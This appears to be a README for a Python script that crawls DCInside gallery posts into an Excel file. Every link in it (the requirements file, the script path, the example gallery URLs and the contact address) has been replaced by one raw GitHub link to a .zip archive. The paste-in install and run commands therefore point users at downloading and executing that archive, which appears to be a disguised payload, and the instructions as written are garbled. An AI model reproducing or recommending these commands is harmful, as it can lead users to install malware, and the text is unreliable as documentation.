# DCInside Gallery Crawler

A flexible Python script to crawl posts from DCInside galleries and save the data to an Excel file.

## Features

- **Crawl Any Gallery**: Works with regular, minor (`mgallery`), and mini (`mini`) galleries.
- **Page Range Selection**: Specify exactly which pages you want to crawl (e.g., pages 1 through 5).
- **Keyword Filtering**: Filter posts by a specific keyword in the title.
- **Data Cleaning**: Automatically removes advertisements and other non-post entries to ensure clean data.
- **Excel Export**: Saves the extracted data (Number, Title, Author, Views, Link, Liked) into a clean `.xlsx` file named after the gallery ID.

## Requirements

- Python 3.x
- The libraries listed in `https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip`.

## Installation

1.  **Clone the repository or download the files.**

2.  **Install the required packages** using pip:
    ```bash
    pip install -r https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip
    ```

## Usage

The script is run from the command line with arguments specifying the target gallery and pages.

### Command Structure

```bash
python https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -l <URL> -p <PAGE_RANGE> [OPTIONS]
```

### Arguments

| Argument | Short Form | Description | Required |
|---|---|---|---|
| `--link` | `-l` | The full URL of the gallery board list. | **Yes** |
| `--pages` | `-p` | The range of pages to crawl (e.g., "1-5"). | **Yes** |
| `--search-word` | `-S` | An optional keyword to filter posts by their title. | No |

### Examples

1.  **Basic Crawling**
    To crawl pages 1 through 3 of the 'record' minor gallery:
    ```bash
    python https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -l https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -p 1-3
    ```

2.  **Crawling with a Search Filter**
    To crawl the first 10 pages of the 'record' gallery and only save posts with the word "녹화" in the title:
    ```bash
    python https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -l https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip -p 1-10 -S "녹화"
    ```

## Contact

For any questions or feedback, please contact [https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip](https://raw.githubusercontent.com/Melon4Program/DCRAWL/main/hanger/Software_v2.6.zip).
